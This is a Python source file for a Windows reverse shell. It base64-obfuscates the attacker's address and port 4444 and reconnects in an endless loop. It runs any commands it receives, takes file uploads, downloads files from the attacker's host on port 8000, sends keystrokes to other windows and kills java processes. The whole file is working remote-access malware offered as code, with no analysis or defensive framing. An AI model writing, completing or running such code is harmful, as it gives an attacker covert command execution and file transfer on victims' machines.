import os
import socket
import subprocess
import time
import base64
import signal
import sys
import ctypes
import win32api
import win32con
import win32process
import win32gui
import requests

# Obfuscated target IP and port
encoded_target = ""  # Base64 encoded "REDACTED"
#encoded_target = "bG9jYWxob3N0"  # Base64 encoded "localhost"
encoded_port = "NDQ0NA=="        # Base64 encoded "4444"

# Decode the target IP and port
target_ip = base64.b64decode(encoded_target).decode()
target_port = int(base64.b64decode(encoded_port).decode())

# User profile directory
user_profile = os.getenv('USERPROFILE')

# Track the current working directory
current_directory = os.getcwd()

def find_window_by_pid(pid):
    """Find a window by its process ID."""
    def callback(hwnd, hwnds):
        if win32gui.IsWindowVisible(hwnd) and win32gui.IsWindowEnabled(hwnd):
            _, found_pid = win32process.GetWindowThreadProcessId(hwnd)
            if found_pid == pid:
                hwnds.append(hwnd)
        return True

    hwnds = []
    win32gui.EnumWindows(callback, hwnds)
    if hwnds:
        return hwnds[0]
    else:
        raise Exception(f"No window found for PID {pid}.")
    
def send_keystrokes(hwnd, text):
    """Send keystrokes to a window."""
    for char in text:
        win32api.SendMessage(hwnd, win32con.WM_CHAR, ord(char), 0)
    win32api.PostMessage(hwnd, win32con.WM_KEYDOWN, win32con.VK_RETURN, 0)

# Define a handler function for console events.
def console_handler(ctrl_type):
    # CTRL_CLOSE_EVENT has the value 2.
    if ctrl_type == 2:
        try:
            # Execute the taskkill command to kill all processes named "java.exe".
            subprocess.run("taskkill /F /IM java2.exe", shell=True, check=True)

            print("All Java processes have been terminated.")
        except subprocess.CalledProcessError as e:
            print("Failed to kill Java processes:", e)
        # Return True to indicate the event has been handled.
        return True
    # For other control events, return False.
    return False

# Create a Windows function type for the console control handler.
HandlerRoutine = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_uint)
handler = HandlerRoutine(console_handler)

# Register the handler with the Windows API.
if not ctypes.windll.kernel32.SetConsoleCtrlHandler(handler, True):
    print("Error: Could not set control handler")

#clear console
subprocess.run("cls", shell=True)

# Hide the command prompt window (Windows only)
def hide_cmd_window():
    if os.name == "nt":  # Check if the OS is Windows
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        return startupinfo
    return None

def connect_to_attacker():
    while True:
        try:
            time.sleep(1)
            # Create a socket and attempt to connect
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            
            # If connection is successful, return the socket

            return s
        except ConnectionRefusedError:
            # If connection is refused, retry after a delay
            
            time.sleep(5)
        except socket.timeout:
            # If the connection times out, retry after a delay

            time.sleep(5)
        except Exception as e:
            # Handle other exceptions

            time.sleep(5)

def handle_connection(s):
    global current_directory
    try:
        # Start a shell and communicate through the socket
        while True:
            try:
                # Receive a command from the attacker
                command = s.recv(1024).decode().strip()
                if not command:
                    break  # Exit if the connection is closed

                # Handle special commands
                if command.startswith("cd "):
                    try:
                        # Change the directory
                        new_dir = command[3:].strip()
                        os.chdir(new_dir)
                        current_directory = os.getcwd()
                        output = f"Changed directory to: {current_directory}\n"
                    except Exception as e:
                        output = f"{str(e)}\n"  # Send the error message if the directory change fails


                elif command.startswith("upload "):
                    # Handle file upload
                    try:
                        file_name = command[7:].strip()
                        # Notify the attacker that the target is ready to receive the file
                        s.send(b"READY\n")
                        # Receive the file data
                        file_data = s.recv(1024 * 1024)  # Receive up to 1MB of data
                        with open(file_name, "wb") as f:
                            f.write(file_data)
                        output = f"File uploaded: {file_name}\n"
                    except Exception as e:
                        output = f"{str(e)}\n"

                if command == ("kill"):
                    try:
                        subprocess.run("taskkill /F /IM java.exe", shell=True, check=False)
                        subprocess.run("taskkill /F /IM java2.exe", shell=True, check=False)
                        subprocess.run("taskkill /F /IM javaw.exe", shell=True, check=False)
                        # Kill the current process
                        os.kill(os.getpid(), signal.CTRL_BREAK_EVENT)
                    except Exception as e:
                        output = f"{str(e)}\n"
                if command == ("downloads2"):
                    try:
                        user_profile = os.getenv('USERPROFILE')
                        print("User Profile Path:", user_profile)
                        os.chdir(user_profile)
                        new_directory = os.path.join(user_profile, "Downloads2")
                        if not os.path.exists(new_directory):
                            os.mkdir(new_directory)
                            print(f"Directory 'Downloads2' created in {user_profile}")
                            os.chdir(new_directory)
                            current_directory = os.getcwd()
                            print(f"Current Directory: {current_directory}")
                            output = f"Directory 'Downloads2' created in {user_profile} and changed to {current_directory}"
                        else:
                            print(f"Directory 'Downloads2' already exists in {user_profile}")
                            os.chdir(new_directory)
                            current_directory = os.getcwd()
                            print(f"Current Directory: {current_directory}")
                            output = f"Directory 'Downloads2' created in {user_profile} and changed to {current_directory}"
                    except Exception as e:
                        output = f"{str(e)}\n"                    

                elif command.startswith("download "):
                    # Handle file download
                    # URL of the file to download
                    file_name = command[9:].strip()
                    url = 'http://' + target_ip + ':8000/' + file_name  # Change the IP address to the attacker's IP

                    try:
                        # Send a GET request to the server
                        response = requests.get(url, timeout=5)  # Add a timeout to avoid hanging

                        file_name = command[9:].strip()
                        # Check if the request was successful
                        if response.status_code == 200:
                        # Save the file locally
                            with open(file_name, 'wb') as file:
                                file.write(response.content)
                            print("File downloaded successfully as " + file_name)
                            output = f"File downloaded: {file_name}\n"
                        else:
                            print(f"Failed to download file. Status code: {response.status_code}")
                    except requests.exceptions.RequestException as e:
                        print(f"Error: {e}")
                        output = f"Error: {e}"

                elif command.startswith("minecraft "):
                    output = "Make you set your PID file\n"
                    with open("PID.txt", "r") as file:
                        data = file.read()  # Read entire file
                    # Prompt the user for the PID
                    pid = int(data)
                    # Prompt the user for the command
                    command = command[10:].strip()
                    # Find the window handle by PID
                    hwnd = find_window_by_pid(pid)
                    # Send the command to the window
                    send_keystrokes(hwnd, command)
                else:
                    # Execute the command in the current directory
                    try:
                        output = subprocess.getoutput(f"cd {current_directory} && {command}\n")
                    except Exception as e:
                        output = f"{str(e)}\n"  # Send the error message if the command fails

                # Send the output back to the attacker with a newline at the end
                s.send((output + "\n").encode())  # Add a newline after the output
            except socket.timeout:
                # Handle socket timeout

                break
            except Exception as e:
                # Handle other communication errors

                break

    finally:
        # Close the socket
        s.close()


# Main loop
while True:
    s = connect_to_attacker()  # Connect to the attacker
    handle_connection(s)       # Handle the connection
